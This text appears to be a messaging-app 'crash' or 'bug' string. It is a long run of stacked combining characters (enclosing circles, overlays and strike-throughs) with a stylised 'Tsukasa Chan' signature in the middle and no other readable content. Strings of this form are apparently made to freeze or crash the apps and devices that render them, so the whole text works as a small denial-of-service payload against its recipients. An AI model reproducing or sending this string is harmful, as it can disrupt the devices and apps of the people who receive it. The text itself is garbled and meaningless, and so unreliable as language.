⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝